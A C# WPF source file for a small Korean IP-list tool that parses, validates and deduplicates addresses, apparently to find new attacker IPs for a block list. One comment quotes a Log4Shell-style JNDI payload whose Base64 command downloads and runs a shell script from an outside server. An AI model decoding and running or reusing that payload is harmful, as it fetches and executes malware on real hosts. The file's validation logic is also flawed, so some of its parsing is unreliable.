using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace DevHelper
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        private DevHelperViewModel _viewModel;
        public MainWindow()
        {
            InitializeComponent();
            DataContext = new DevHelperViewModel();
        }

        // 중복을 제거하는 자료구조 hashset 선언
        HashSet<string> ipList = new HashSet<string>();
        HashSet<string> newipList = new HashSet<string>();

        public string text1IpCheck(string str)
        {
            string[] sep = { " " };
            string[] words = str.Split(sep, System.StringSplitOptions.RemoveEmptyEntries);

            string[] sep2 = { "/" };
            string[] words2 = words[0].Split(sep2, System.StringSplitOptions.RemoveEmptyEntries);
            return words2[0] != null ? words2[0] : string.Empty;
        }

        public string text2IpCheck(string str)
        {
            // 여기선 케이스가 2개
            // 1) 116.138.115.108
            // 2) 159.203.59.44:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguMTA0LjI0MToxOTgwL2FrdHVhbGlzaWVyZW4uc2ggLW8gYWt0dWFsaXNpZXJlbi5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC4xMDQuMjQxOjE5ODAvYWt0dWFsaXNpZXJlbi5zaDsgY2htb2QgNzc3IGFrdHVhbGlzaWVyZW4uc2g7IHNoIGFrdHVhbGlzaWVyZW4uc2g7IHJtIC1yZiBha3R1YWxpc2llcmVuLnNoOyBybSAtcmYgYWt0dWFsaXNpZXJlbi5zaC4xOyBybSAtcmYgS29iYWx0Lio=
            // 3) 110.45.146.209/jaws
            string[] sep = { "/" };
            string[] words = str.Split(sep, System.StringSplitOptions.RemoveEmptyEntries);

            if(!string.IsNullOrEmpty(words[0]) && words[0].Contains(":"))
            {
                string[] sep2 = { ":" };
                string[] words2 = words[0].Split(sep2, System.StringSplitOptions.RemoveEmptyEntries);
                return words2[0] != null ? words2[0] : string.Empty;
            }
            else
            {
                return words[0] != null ? words[0] : string.Empty;
            }
        }

        // 아이피인지 체크하는 정규식
        public static bool IsIPAddr(string sIPAddr)
        {
            bool isIPAddr = false;

            Regex regex = new Regex(@"^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$");
            if (regex.IsMatch(sIPAddr))
            {
                isIPAddr = true;
            }

            return isIPAddr;
        }

        private void TextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            // hash set 초기화
            ipList.Clear();
            //CONVERTRESULT.Text = ((System.Windows.Controls.TextBox)sender).Text;

            // 1. 변환하기 위한 값 tmp 변수에 넣기
            string tmpResult = ((System.Windows.Controls.TextBox)sender).Text;

            // 2. '\r\n' 파싱하기
            string[] sep = { "\r\n" };
            string[] words = tmpResult.Split(sep, System.StringSplitOptions.RemoveEmptyEntries);

            // 3. 파싱된 값을 hashSet에 저장
            for(int i = 0; i < words.Length; i++)
            {
                if (!string.IsNullOrEmpty(text1IpCheck(words[i])))
                {
                    ipList.Add(text1IpCheck(words[i]));
                }
            }         
        }

        private void TextBox2_TextChanged(object sender, TextChangedEventArgs e)
        {
            //CONVERTRESULT.Text = ((System.Windows.Controls.TextBox)sender).Text;

            // 1. 변환하기 위한 값 tmp 변수에 넣기
            string tmpResult = ((System.Windows.Controls.TextBox)sender).Text;

            // 2. '\r\n' 파싱하기
            string[] sep = { "\r\n" };
            string[] words = tmpResult.Split(sep, System.StringSplitOptions.RemoveEmptyEntries);

            // 3. 파싱된 값을 hashSet에 저장
            for (int i = 0; i < words.Length; i++)
            {
                if (!string.IsNullOrEmpty(text2IpCheck(words[i])) && IsIPAddr(words[i]))
                {
                    newipList.Add(text2IpCheck(words[i]));
                }
            }

            // 3. 출력
            // 3-1. 출력 전 클리어
            CONVERTRESULT.Text = string.Empty;
            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < newipList.Count(); i++)
            {
                foreach(var item in newipList)
                {
                    if (ipList.Add(item)){
                        sb.Append(string.Format("{0}", item));
                        sb.Append("\n");
                    }
                }
            }
            CONVERTRESULT.Text = sb.ToString();
        }
    }
}


/*
// 1. 변환하기 위한 값 tmp 변수에 넣기
            string tmpResult = ((System.Windows.Controls.TextBox)sender).Text;

// 2. '\r\n' 파싱하기
string[] sep = { "\r\n" };
string[] words = tmpResult.Split(sep, System.StringSplitOptions.RemoveEmptyEntries);

// 3. 출력
// 3-1. 출력 전 클리어
CONVERTRESULT.Text = string.Empty;
            StringBuilder sb = new StringBuilder();
sb.Append("IN (");
            for (int i = 0; i<words.Length; i++)
            {

                if (i == 0 && words.Length == 1)
                {
                    sb.Append(string.Format("'{0}')", words[i]));
                }
                else if (i == 0)
                {
                    sb.Append(string.Format("'{0}'", words[i]));
                }
                else if (i == words.Length - 1)
                {
                    sb.Append(string.Format(",'{0}')", words[i]));
                }
                else
                {
                    sb.Append(string.Format(",'{0}'", words[i]));
                }
                sb.Append("\n");
            }*/